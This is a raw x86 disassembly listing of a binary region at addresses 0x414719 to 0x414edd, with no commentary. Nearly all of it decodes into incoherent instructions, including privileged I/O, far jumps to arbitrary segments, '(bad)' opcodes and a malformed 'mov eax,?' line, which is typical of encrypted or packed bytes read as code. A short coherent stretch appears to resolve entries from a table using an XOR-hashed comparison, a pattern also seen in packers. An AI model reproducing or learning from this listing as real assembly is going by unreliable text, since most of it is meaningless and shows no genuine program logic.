  414719:	sub    BYTE PTR [esi+edx*2-0x6a55e188],al
  414720:	imul   edi,DWORD PTR [ebp+edi*2+0x23],0x40276064
  414728:	fcomi  st,st(7)
  41472a:	loop   0x4146d3
  41472c:	outs   dx,DWORD PTR ds:[esi]
  41472d:	lea    ebx,[ecx-0x72cc2e0c]
  414733:	jno    0x414772
  414735:	mov    ecx,edi
  414737:	repnz popf 
  414739:	push   ebp
  41473a:	push   es
  41473b:	aad    0x8
  41473d:	nop
  41473e:	fisubr WORD PTR [edx-0x1a]
  414741:	out    dx,al
  414742:	pop    ds
  414743:	xchg   esi,eax
  414744:	mov    ecx,0xb6018ed9
  414749:	jecxz  0x4146e9
  41474b:	jmp    0x4146fb
  41474d:	mov    al,ds:0xd70bc137
  414752:	aad    0x86
  414754:	mov    al,0x2f
  414756:	ds pop edi
  414758:	jmp    0x2e8a6222
  41475d:	xchg   esi,eax
  41475e:	mov    dl,0xa2
  414760:	rcr    BYTE PTR [edi],1
  414762:	arpl   WORD PTR [edx],si
  414764:	cmp    ebx,0x5a2297d4
  41476a:	ret    0x6b53
  41476d:	jmp    0xda32:0x5577486b
  414774:	rol    al,0x92
  414777:	fsub   DWORD PTR [esi-0x28b0311d]
  41477d:	mov    edi,ebp
  41477f:	loop   0x414728
  414781:	xchg   ah,cl
  414783:	dec    esp
  414784:	pop    eax
  414785:	adc    bh,BYTE PTR [edi+0x1a]
  414788:	lea    ecx,[ebp-0x7d8dbcb7]
  41478e:	pop    edx
  41478f:	xchg   ecx,eax
  414790:	jno    0x4147f7
  414792:	push   ebx
  414793:	mov    esp,0xb06bcdf3
  414798:	rcr    DWORD PTR [ecx-0x7c],cl
  41479b:	ss popf 
  41479d:	data16 mov bh,BYTE PTR [ecx]
  4147a0:	push   0xfffffff5
  4147a2:	icebp  
  4147a3:	push   esi
  4147a4:	xchg   DWORD PTR es:[esi+0x5a],ebp
  4147a8:	aas    
  4147a9:	sbb    eax,0x836966db
  4147ae:	out    0xf,eax
  4147b0:	loope  0x4147b7
  4147b2:	loopne 0x41479d
  4147b4:	inc    esp
  4147b5:	pop    esi
  4147b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147b7:	test   al,0xc
  4147b9:	dec    edx
  4147ba:	fsub   QWORD PTR [ebx-0x73]
  4147bd:	mov    ch,bl
  4147bf:	pop    esi
  4147c0:	loop   0x4147ec
  4147c2:	push   cs
  4147c3:	mov    al,ds:0xe88ca6bd
  4147c8:	xchg   bl,dh
  4147ca:	in     al,dx
  4147cb:	pushf  
  4147cc:	pop    ebp
  4147cd:	lahf   
  4147ce:	stos   DWORD PTR es:[edi],eax
  4147cf:	aam    0x5c
  4147d1:	adc    DWORD PTR [ebp+0xd],eax
  4147d4:	shl    BYTE PTR [esi+eiz*2],cl
  4147d7:	and    ebp,DWORD PTR ds:0x4012c0d5
  4147dd:	mov    al,ds:0x3fa7dd1b
  4147e2:	pop    es
  4147e3:	lahf   
  4147e4:	lea    edi,[ebx-0x5168b016]
  4147ea:	ss std 
  4147ec:	lods   eax,DWORD PTR ds:[esi]
  4147ed:	test   eax,0x1584d63d
  4147f2:	bnd jmp 0xd918f724
  4147f8:	std    
  4147f9:	call   0x144a2a40
  4147fe:	sub    bl,ch
  414800:	adc    esi,eax
  414802:	pop    eax
  414803:	jmp    0x83c3e1c0
  414808:	and    DWORD PTR [ebp+ecx*1-0x18],ecx
  41480c:	pusha  
  41480d:	stos   DWORD PTR es:[edi],eax
  41480e:	mov    eax,0xfd5c53f
  414813:	cmp    ebp,DWORD PTR [ecx]
  414815:	fnstcw WORD PTR [eax-0x6d4a5a2f]
  41481b:	inc    esp
  41481c:	test   BYTE PTR [edi+0x65f7bfe4],dh
  414822:	jno    0x41486b
  414824:	inc    esp
  414825:	sbb    DWORD PTR [eax-0x5ad3f8cb],edi
  41482b:	mov    edi,0x61e0c5f4
  414830:	addr16 pusha 
  414832:	add    al,0xe9
  414834:	xor    dl,dh
  414836:	std    
  414837:	popa   
  414838:	scas   eax,DWORD PTR es:[edi]
  414839:	gs ds pop ss
  41483c:	outs   dx,DWORD PTR ds:[esi]
  41483d:	mov    ebp,DWORD PTR [esi-0x50b1c6bc]
  414843:	fist   WORD PTR [edx+esi*2-0x7b27491]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x4148a2
  414861:	xor    eax,0x7d129e56
  414866:	jg     0x4148d8
  414868:	mov    ecx,0x6570707e
  41486d:	xor    cl,BYTE PTR [eax-0x31]
  414870:	push   ebx
  414871:	inc    ecx
  414872:	mov    ah,0x3c
  414874:	mov    eax,0x474ca2d2
  414879:	sub    eax,0x6eac153a
  41487e:	lds    ebp,FWORD PTR [eax*1-0x29c6e592]
  414885:	mov    ah,BYTE PTR [ebp-0x7a]
  414888:	test   eax,0x83c58fe4
  41488d:	lock xor ah,BYTE PTR [ebp+0x58]
  414891:	jns    0x41485f
  414893:	sub    al,0x28
  414895:	jle    0x4148be
  414897:	dec    ecx
  414898:	rcl    BYTE PTR [esp+edi*8-0x4cb23939],1
  41489f:	test   al,0x52
  4148a1:	sbb    ebp,DWORD PTR [edx]
  4148a3:	dec    ebx
  4148a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148a5:	add    bh,BYTE PTR [eax+ebp*1-0x61]
  4148a9:	pop    ebp
  4148aa:	push   ds
  4148ab:	dec    edx
  4148ac:	mov    cl,0x71
  4148ae:	popf   
  4148af:	add    esi,DWORD PTR [esi-0x4d]
  4148b2:	iret   
  4148b3:	in     al,dx
  4148b4:	or     BYTE PTR [edi-0x2],dh
  4148b7:	pop    ecx
  4148b8:	cs add ebx,edx
  4148bb:	pop    ecx
  4148bc:	(bad)  
  4148bd:	sub    dh,ch
  4148bf:	pop    edi
  4148c0:	into   
  4148c1:	mov    ds:0x23573c5,al
  4148c6:	daa    
  4148c7:	and    esp,DWORD PTR [edx]
  4148c9:	add    DWORD PTR [edx-0x6b],0x19
  4148cd:	inc    eax
  4148ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148cf:	xor    eax,0x6df50a0c
  4148d4:	sbb    ch,bh
  4148d6:	jecxz  0x4148f8
  4148d8:	xor    edx,edi
  4148da:	or     dh,BYTE PTR [edi]
  4148dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148dd:	ror    BYTE PTR [esi],0xc
  4148e0:	jmp    0xb2d5:0x536bd8c7
  4148e7:	inc    ecx
  4148e8:	lods   eax,DWORD PTR ds:[esi]
  4148e9:	repnz xchg ebp,eax
  4148eb:	fs fwait
  4148ed:	aaa    
  4148ee:	xchg   ebp,eax
  4148ef:	shr    BYTE PTR [eax+0x7253a11a],1
  4148f5:	xor    eax,0x9ddff54a
  4148fa:	sahf   
  4148fb:	nop
  4148fc:	imul   edx,DWORD PTR [eax],0x8cb70821
  414902:	pop    edx
  414903:	mov    edx,0xa2826138
  414908:	fild   QWORD PTR [edx+ebx*4-0x21]
  41490c:	xor    dl,bh
  41490e:	leave  
  41490f:	jge    0x414990
  414911:	mov    ah,0x41
  414913:	jmp    0xc8003080
  414918:	jae    0x41493f
  41491a:	push   ds
  41491b:	push   esp
  41491c:	mov    cl,0x2a
  41491e:	xchg   esp,eax
  41491f:	out    0x56,al
  414921:	lea    edi,[ebx]
  414923:	fiadd  WORD PTR [eax]
  414925:	js     0x414954
  414927:	mov    bl,0x17
  414929:	cs iret 
  41492b:	dec    ecx
  41492c:	jp     0x4148d2
  41492e:	pop    edi
  41492f:	mov    dl,0x87
  414931:	jge    0x4149ab
  414933:	jmp    0xf053:0x70f243fe
  41493a:	xchg   ebx,eax
  41493b:	cmc    
  41493c:	inc    DWORD PTR [esi+ebp*4]
  41493f:	adc    DWORD PTR [edi],esp
  414941:	dec    edi
  414942:	aaa    
  414943:	jl     0x414989
  414945:	dec    esp
  414946:	(bad)  
  414947:	in     eax,dx
  414948:	hlt    
  414949:	xchg   DWORD PTR [ebp-0x7f],esp
  41494c:	xchg   esi,eax
  41494d:	iret   
  41494e:	xchg   DWORD PTR [edi-0x482c4891],edi
  414954:	sub    dh,0x68
  414957:	jo     0x414921
  414959:	and    ebp,DWORD PTR [ecx-0x22]
  41495c:	xchg   esp,eax
  41495d:	inc    esi
  41495e:	popf   
  41495f:	aaa    
  414960:	das    
  414961:	shr    al,1
  414963:	dec    ebx
  414964:	sbb    BYTE PTR [ecx+0x5b],0x7a
  414968:	and    al,0xce
  41496a:	xor    al,0xed
  41496c:	cmp    BYTE PTR ss:0x9df314e0,cl
  414973:	jmp    0xfdd1:0x635fd942
  41497a:	popa   
  41497b:	and    BYTE PTR [ecx],dh
  41497d:	rcr    DWORD PTR [edx-0x28],1
  414980:	imul   ah
  414982:	scas   al,BYTE PTR es:[edi]
  414983:	ins    DWORD PTR es:[di],dx
  414985:	cdq    
  414986:	mov    BYTE PTR [edx],bh
  414988:	ja     0x414993
  41498a:	mov    dl,0x4b
  41498c:	pusha  
  41498d:	fwait
  41498e:	std    
  41498f:	push   ebp
  414990:	fucomip st,st(1)
  414992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414993:	push   0x5686e9f
  414998:	and    DWORD PTR [eax],eax
  41499a:	call   0x2aea:0x931976bf
  4149a1:	loope  0x414928
  4149a3:	ficomp DWORD PTR [eax]
  4149a5:	mov    al,0x74
  4149a7:	(bad)  
  4149a8:	xlat   BYTE PTR ds:[ebx]
  4149a9:	inc    edx
  4149aa:	js     0x4149fb
  4149ac:	iret   
  4149ad:	fdiv   QWORD PTR [ebp-0x7]
  4149b0:	xor    BYTE PTR ds:0x9a18078f,ch
  4149b6:	je     0x41495e
  4149b8:	pop    ebx
  4149b9:	xlat   BYTE PTR ds:[ebx]
  4149ba:	xor    al,0xaa
  4149bc:	and    BYTE PTR [edx+0x5a],ah
  4149bf:	test   DWORD PTR [edi-0x49b9bf48],ebx
  4149c5:	mov    ds,WORD PTR [edi+edi*4]
  4149c8:	mov    eax,?
  4149ca:	jb     0x414977
  4149cc:	sub    dl,al
  4149ce:	fbld   TBYTE PTR [esi+0x77]
  4149d1:	mov    bh,0x39
  4149d3:	sbb    al,0x7b
  4149d5:	push   ecx
  4149d6:	cmp    ch,BYTE PTR [ecx+0x2a]
  4149d9:	sbb    DWORD PTR [eax],esi
  4149db:	cmp    bh,BYTE PTR [edi]
  4149dd:	pop    es
  4149de:	lds    ebx,FWORD PTR ds:0x51e7fb90
  4149e4:	mov    ebx,0x6b6c4c54
  4149e9:	sub    bl,BYTE PTR [ebx+eax*1-0x42]
  4149ed:	jp     0x41499c
  4149ef:	popf   
  4149f0:	(bad)  
  4149f1:	ss add al,0x6
  4149f4:	outs   dx,DWORD PTR ds:[esi]
  4149f5:	daa    
  4149f6:	or     DWORD PTR [esp+edi*1+0xa],0xf00b1922
  4149fe:	(bad)
  414a01:	scas   al,BYTE PTR es:[edi]
  414a02:	dec    ebx
  414a03:	sbb    al,0x5
  414a05:	xor    BYTE PTR [esi-0x3a1cef81],dh
  414a0b:	ss jp  0x414a0c
  414a0e:	aas    
  414a0f:	(bad)  
  414a10:	data16 and al,0xe1
  414a13:	shl    DWORD PTR [edx],1
  414a15:	cdq    
  414a16:	cs sub eax,0x1d041cf6
  414a1c:	shr    dh,0x51
  414a1f:	pop    esi
  414a20:	gs jecxz 0x4149b7
  414a23:	mov    eax,edx
  414a25:	aaa    
  414a26:	test   ebx,edi
  414a28:	pop    esp
  414a29:	fsub   st(1),st
  414a2b:	ret    
  414a2c:	shl    bl,0x62
  414a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a30:	jo     0x4149d7
  414a32:	vpcmpeqw ymm5,ymm1,ymm2
  414a36:	lods   al,BYTE PTR ds:[esi]
  414a37:	iret   
  414a38:	and    ah,bl
  414a3a:	ret    
  414a3b:	push   esi
  414a3c:	stos   DWORD PTR es:[edi],eax
  414a3d:	je     0x4149fc
  414a3f:	add    DWORD PTR [edi],esp
  414a41:	ret    
  414a42:	and    ecx,DWORD PTR [ebp+0x19c69cb9]
  414a48:	jae    0x414a32
  414a4a:	lock and ecx,eax
  414a4d:	popa   
  414a4e:	xchg   ecx,eax
  414a4f:	xor    dl,BYTE PTR [ebx]
  414a51:	out    dx,eax
  414a52:	cmc    
  414a53:	push   ds
  414a54:	shr    DWORD PTR [edx+edi*2-0x31c05a52],1
  414a5b:	test   DWORD PTR [ecx+0x49f8f7de],0x52c44afc
  414a65:	mov    dh,0xce
  414a67:	cli    
  414a68:	and    al,0x2b
  414a6a:	lahf   
  414a6b:	cmp    dh,BYTE PTR [ebx+edx*8+0x2f]
  414a6f:	scas   eax,DWORD PTR es:[edi]
  414a70:	retf   0xb90c
  414a73:	mov    dl,0xca
  414a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a76:	jno    0x414a5c
  414a78:	int    0x4e
  414a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a7b:	push   0xffffffbb
  414a7d:	cmp    DWORD PTR [eax],ebx
  414a7f:	gs pop edx
  414a81:	mov    edx,0x9f353bb2
  414a86:	push   esi
  414a87:	push   ds
  414a88:	mov    edi,0xa281ebe7
  414a8d:	je     0x414a37
  414a8f:	in     al,dx
  414a90:	gs pusha 
  414a92:	push   esi
  414a93:	inc    ebx
  414a94:	xchg   esi,eax
  414a95:	xor    al,0xa9
  414a97:	jp     0x414a37
  414a99:	ror    DWORD PTR [ebx+0x5f],1
  414a9c:	sbb    al,0x96
  414a9e:	(bad)  
  414a9f:	in     al,dx
  414aa0:	pop    DWORD PTR [edi+0x3c6bc5e7]
  414aa6:	xchg   esi,eax
  414aa7:	sti    
  414aa8:	pop    esp
  414aa9:	push   ebx
  414aaa:	call   0xb7d9:0x6b754c41
  414ab1:	pop    ss
  414ab2:	cmp    DWORD PTR [eax],ebp
  414ab4:	xor    DWORD PTR [ebx+ebx*1],eax
  414ab7:	dec    edx
  414ab8:	dec    ecx
  414ab9:	sub    dh,BYTE PTR [ebx-0x2b]
  414abc:	xor    ebp,eax
  414abe:	leave  
  414abf:	ret    
  414ac0:	mov    ecx,0xa7e6899c
  414ac5:	mov    ds:0x7756d786,al
  414aca:	jns    0x414af4
  414acc:	jl     0x414b20
  414ace:	repz fldenv [ebp+0x3d]
  414ad2:	cmp    eax,0x39562a9
  414ad7:	inc    ebp
  414ad8:	(bad)  
  414ada:	scas   eax,DWORD PTR es:[edi]
  414adb:	sbb    BYTE PTR [ecx-0x676876e9],ch
  414ae1:	push   0xd754642b
  414ae6:	int    0x32
  414ae8:	dec    ebp
  414ae9:	dec    esp
  414aea:	sbb    ebx,DWORD PTR [edi]
  414aec:	jg     0x414b62
  414aee:	adc    bl,al
  414af0:	stos   DWORD PTR es:[edi],eax
  414af1:	ret    
  414af2:	es jp  0x414aac
  414af5:	aam    0xba
  414af7:	cmc    
  414af8:	aaa    
  414af9:	xor    eax,0x16456a2f
  414afe:	add    al,0x9b
  414b00:	or     eax,0x67881fb1
  414b05:	es dec ecx
  414b07:	sbb    bh,ah
  414b09:	jnp    0x414b6a
  414b0b:	sbb    DWORD PTR [ebx+0x7258a56f],0xffffffe2
  414b12:	inc    edi
  414b13:	adc    eax,esi
  414b15:	fmulp  st(2),st
  414b17:	test   DWORD PTR [esi+0x4e613783],ecx
  414b1d:	and    esp,DWORD PTR [eax-0x2a]
  414b20:	cmp    esp,edi
  414b22:	mov    edi,0x7a7b8507
  414b27:	jge    0x414b34
  414b29:	fbld   TBYTE PTR [esi+0x4967f2be]
  414b2f:	(bad)  
  414b31:	adc    cl,BYTE PTR [edx+0x3]
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	or     BYTE PTR [edi+0x47],0xd0
  414bba:	pop    ebx
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b7b
  414bc3:	cwde   
  414bc4:	repnz sar al,0x2
  414bc8:	in     eax,dx
  414bc9:	inc    ebx
  414bca:	cmp    al,0xe2
  414bcc:	dec    ebx
  414bcd:	dec    edi
  414bce:	gs mov esp,0x762305fa
  414bd4:	xor    eax,0x21f8491b
  414bd9:	lods   eax,DWORD PTR ds:[esi]
  414bda:	fldcw  WORD PTR [eax]
  414bdc:	les    edx,FWORD PTR [esi-0x3e4d16df]
  414be2:	sub    ah,cl
  414be4:	(bad)
  414be7:	hlt    
  414be8:	xlat   BYTE PTR ds:[ebx]
  414be9:	push   0xffffff8a
  414beb:	adc    al,0xe5
  414bed:	or     DWORD PTR [eax+0x63],esi
  414bf0:	mov    edx,0xe4c735e1
  414bf5:	stc    
  414bf6:	arpl   WORD PTR [ecx],dx
  414bf8:	cmp    cl,BYTE PTR [ebx+0x32]
  414bfb:	add    eax,0xdf67591f
  414c00:	and    esi,DWORD PTR [ebx]
  414c02:	xlat   BYTE PTR ds:[ebx]
  414c03:	dec    edx
  414c04:	test   eax,0xa94291fa
  414c09:	push   cs
  414c0a:	push   0x7125e6f7
  414c0f:	ja     0x414bc0
  414c11:	loop   0x414c05
  414c13:	adc    BYTE PTR [eax+0x1937ff16],0x9a
  414c1a:	lea    eax,[edi]
  414c1c:	popf   
  414c1d:	push   DWORD PTR [eax+0x794abdc4]
  414c23:	mov    ebp,0xc168c10b
  414c28:	pop    ds
  414c29:	pop    eax
  414c2a:	and    WORD PTR [ecx],ax
  414c2d:	call   0x350b:0xec502559
  414c34:	xchg   edi,eax
  414c35:	test   al,0x12
  414c37:	(bad)  
  414c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c3a:	mov    al,BYTE PTR [eax-0xe6217bc]
  414c40:	xchg   edx,eax
  414c41:	sbb    ebx,eax
  414c43:	stos   DWORD PTR es:[edi],eax
  414c44:	mov    ecx,0xbc5711c6
  414c49:	icebp  
  414c4a:	add    dh,BYTE PTR [eax+0x3fc045b4]
  414c50:	in     eax,dx
  414c51:	xchg   ebx,eax
  414c52:	push   ebx
  414c53:	sub    eax,0xe73087be
  414c58:	dec    eax
  414c59:	pusha  
  414c5a:	sub    BYTE PTR [ecx],0x83
  414c5d:	pushf  
  414c5e:	sbb    dl,BYTE PTR [eax+0x5dfb05ed]
  414c64:	call   0x702291aa
  414c69:	test   al,0x79
  414c6b:	mov    BYTE PTR [ebx-0x44ee4bd2],dh
  414c71:	cli    
  414c72:	out    dx,eax
  414c73:	out    dx,al
  414c74:	and    eax,0x6ccfdb4b
  414c79:	mov    ds:0xd72803f1,al
  414c7e:	call   0x3776:0x604a9e0d
  414c85:	cmp    edx,DWORD PTR [eax+0x38]
  414c88:	mov    ds:0xd79cbb6a,eax
  414c8d:	retf   0xb233
  414c90:	mov    BYTE PTR [eax],bh
  414c92:	mov    al,ds:0xa745ff10
  414c97:	xor    cl,dh
  414c99:	fisttp WORD PTR cs:[ebx]
  414c9c:	jecxz  0x414d19
  414c9e:	icebp  
  414c9f:	ins    DWORD PTR es:[edi],dx
  414ca0:	inc    ebx
  414ca1:	push   edx
  414ca2:	ins    DWORD PTR es:[edi],dx
  414ca3:	enter  0x2058,0xdb
  414ca7:	gs pusha 
  414ca9:	pusha  
  414caa:	aam    0x8
  414cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cad:	push   ss
  414cae:	leave  
  414caf:	sahf   
  414cb0:	xchg   edx,eax
  414cb1:	loop   0x414ce9
  414cb3:	xchg   edi,eax
  414cb4:	fnstenv [ebx-0x26]
  414cb7:	mov    WORD PTR [edx+0x5a],dx
  414cbb:	pop    edx
  414cbc:	mov    bh,0x62
  414cbe:	sub    eax,DWORD PTR [ebx]
  414cc0:	mov    dl,0x3a
  414cc2:	scas   eax,DWORD PTR es:[edi]
  414cc3:	jle    0x414c5a
  414cc5:	add    eax,0x30c5d550
  414cca:	sub    eax,DWORD PTR [edx]
  414ccc:	sub    eax,0x53c917a
  414cd1:	pop    ebx
  414cd2:	ja     0x414cab
  414cd4:	jnp    0x414c6c
  414cd6:	lods   al,BYTE PTR ds:[esi]
  414cd7:	imul   DWORD PTR [ebx+0x5c]
  414cda:	inc    edi
  414cdb:	push   ds
  414cdc:	sub    eax,DWORD PTR [ebx+eiz*1+0x68]
  414ce0:	cli    
  414ce1:	pop    eax
  414ce2:	pusha  
  414ce3:	xchg   esi,eax
  414ce4:	shr    BYTE PTR [ecx+esi*1+0x60],cl
  414ce8:	lea    ebp,[ecx-0x5076dddd]
  414cee:	mov    al,0x1e
  414cf0:	sahf   
  414cf1:	pop    ebx
  414cf2:	out    dx,eax
  414cf3:	int    0x5b
  414cf5:	pop    es
  414cf6:	nop
  414cf7:	sub    cl,al
  414cf9:	sbb    esp,ecx
  414cfb:	lea    edx,ss:[eax]
  414cfe:	ss fwait
  414d00:	xchg   ebp,eax
  414d01:	add    BYTE PTR [eax-0x7],ah
  414d04:	fistp  WORD PTR [esp+eax*1-0xc]
  414d08:	mov    edi,0xebe50b58
  414d0d:	shl    ah,cl
  414d0f:	or     eax,0xe756d3d4
  414d14:	dec    eax
  414d15:	mov    WORD PTR [edi-0x398e6c74],ss
  414d1b:	xchg   ebp,eax
  414d1c:	nop    esp
  414d1f:	les    ebp,FWORD PTR ds:0x3a62d19a
  414d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d26:	aaa    
  414d27:	and    ebx,ecx
  414d29:	push   esp
  414d2a:	cmp    eax,ebp
  414d2c:	cdq    
  414d2d:	sbb    DWORD PTR [ecx-0x34],edi
  414d30:	ja     0x414ced
  414d32:	mov    dl,0x3c
  414d34:	ja     0x414cc5
  414d36:	inc    eax
  414d37:	jnp    0x414ce2
  414d39:	sbb    al,0x49
  414d3b:	fnsave [ebx+0xba02d37]
  414d41:	cmp    DWORD PTR [esp+ecx*2-0x71],0xfa49f8e7
  414d49:	jo     0x414dc4
  414d4b:	sub    BYTE PTR [esi+0x2d],ch
  414d4e:	cli    
  414d4f:	cmp    al,0xd0
  414d51:	cmp    BYTE PTR [ebx],ah
  414d53:	js     0x414d88
  414d55:	daa    
  414d56:	sbb    al,0xcf
  414d58:	add    BYTE PTR [ebp-0x609f857a],ch
  414d5e:	dec    edx
  414d5f:	dec    edi
  414d60:	fnstcw WORD PTR [edx]
  414d62:	in     eax,dx
  414d63:	je     0x414d9e
  414d65:	add    BYTE PTR [esi+0x4f],ch
  414d68:	add    DWORD PTR [edi],ebp
  414d6a:	jno    0x414db8
  414d6c:	(bad)  
  414d6d:	out    0x27,al
  414d6f:	mov    edx,0xc79289d2
  414d74:	data16 jno 0x414db4
  414d77:	dec    ecx
  414d78:	iret   
  414d79:	lods   eax,DWORD PTR ds:[esi]
  414d7a:	push   ds
  414d7b:	push   edi
  414d7c:	inc    ebx
  414d7d:	leave  
  414d7e:	fimul  DWORD PTR [edi+0x63bf3505]
  414d84:	nop
  414d85:	in     eax,0xd1
  414d87:	in     al,dx
  414d88:	repz jmp 0x414d83
  414d8b:	(bad)  
  414d8c:	fdivrp st(6),st
  414d8e:	sbb    al,0x52
  414d90:	jmp    0x70c9f132
  414d95:	test   eax,ebx
  414d97:	ins    DWORD PTR es:[edi],dx
  414d98:	sbb    al,0xd7
  414d9a:	jmp    0xad41c102
  414d9f:	mov    BYTE PTR [eax],al
  414da1:	push   ebp
  414da2:	sets   BYTE PTR [edx-0x5f9ba167]
  414da9:	pop    ds
  414daa:	mov    WORD PTR [esi+0x2f],ss
  414dad:	fwait
  414dae:	cmp    DWORD PTR [ecx+0x1b],edi
  414db1:	(bad)  
  414db2:	xor    dl,ch
  414db4:	adc    DWORD PTR [ebx],0xa7868315
  414dba:	in     al,0xab
  414dbc:	popa   
  414dbd:	int3   
  414dbe:	jb     0x414d56
  414dc0:	pop    ebx
  414dc1:	push   0x2cfe9b4f
  414dc6:	mov    cl,0x67
  414dc8:	ret    0x6f6
  414dcb:	(bad)
  414dd1:	mov    al,ds:0xa5a25042
  414dd6:	xchg   ecx,eax
  414dd7:	push   DWORD PTR [edx]
  414dd9:	sbb    DWORD PTR [edi+ecx*2+0x1c67c064],ebp
  414de0:	xchg   ecx,eax
  414de1:	mov    edi,0x1a244e2d
  414de6:	cmc    
  414de7:	xchg   ebx,eax
  414de8:	shl    bh,0x6b
  414deb:	jmp    0x732fe555
  414df0:	sbb    al,0xbb
  414df2:	int    0xc8
  414df4:	xchg   ecx,eax
  414df5:	mov    cl,BYTE PTR [ebx-0x55]
  414df8:	call   0x76d64ae
  414dfd:	ins    BYTE PTR es:[edi],dx
  414dfe:	repnz inc ebp
  414e00:	push   es
  414e01:	add    BYTE PTR [edx],cl
  414e03:	fcmovnbe st,st(1)
  414e05:	aaa    
  414e06:	cs pop ecx
  414e08:	ja     0x414df2
  414e0a:	push   cs
  414e0b:	pop    eax
  414e0c:	rcl    ah,1
  414e0e:	push   DWORD PTR [ebx-0x44]
  414e11:	xchg   ebp,eax
  414e12:	inc    eax
  414e13:	jo     0x414dac
  414e15:	test   eax,0x6a2efacd
  414e1a:	retf   0x47dc
  414e1d:	mov    esp,0xdbd10a00
  414e22:	and    edx,DWORD PTR [edx-0x42]
  414e25:	stc    
  414e26:	cdq    
  414e27:	mov    BYTE PTR [ebx+0x7a],0xf2
  414e2b:	add    DWORD PTR [edx+eiz*4],edx
  414e2e:	arpl   WORD PTR [ebp+0x42],si
  414e31:	inc    eax
  414e32:	and    eax,0x648e95e9
  414e37:	or     ebp,eax
  414e39:	mov    ebx,0x9c828fa1
  414e3e:	dec    ecx
  414e3f:	ss push 0xcc4c9b88
  414e45:	mov    gs,edi
  414e47:	fwait
  414e48:	cmc    
  414e49:	sbb    al,0xf
  414e4b:	inc    edx
  414e4c:	pop    ecx
  414e4d:	xor    ecx,DWORD PTR [ecx+0x5]
  414e50:	ror    cl,cl
  414e52:	and    al,0x5c
  414e54:	xchg   edi,eax
  414e55:	jl     0x414e00
  414e57:	in     eax,0x7d
  414e59:	and    eax,0x9e474516
  414e5e:	mov    DWORD PTR [edx-0x12],edi
  414e61:	jnp    0x414e77
  414e63:	mov    eax,ds:0x6768246
  414e68:	or     eax,0x7d801fc4
  414e6d:	dec    ebp
  414e6e:	pop    eax
  414e6f:	jecxz  0x414e01
  414e71:	lds    eax,FWORD PTR [esi+ebx*8]
  414e74:	pop    ecx
  414e75:	cmp    eax,0x48497e77
  414e7a:	add    ch,BYTE PTR [esi+0x1e]
  414e7d:	sub    edi,0x22
  414e80:	jl     0x414e25
  414e82:	and    al,0x68
  414e84:	loope  0x414e3f
  414e86:	int    0xc0
  414e88:	lds    ebx,FWORD PTR [ecx+0x6a]
  414e8b:	add    eax,0xcb875b49
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	(bad)  
  414ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eae:	in     al,0x6a
  414eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414f35
  414eb9:	test   DWORD PTR [ebx+0x31e6f3],esi
  414ebf:	outs   dx,DWORD PTR ds:[esi]
  414ec0:	dec    esi
  414ec1:	stc    
  414ec2:	fistp  DWORD PTR [edi]
  414ec4:	xor    edi,edi
  414ec6:	adc    esi,DWORD PTR [esi+0x65364b62]
  414ecc:	sub    al,0xc5
  414ece:	pop    edx
  414ecf:	mov    esp,0x1f9f48ac
  414ed4:	jo     0x414eaa
  414ed6:	into   
  414ed7:	sti    
  414ed8:	jmp    0xb09df463
  414edd:	hlt    
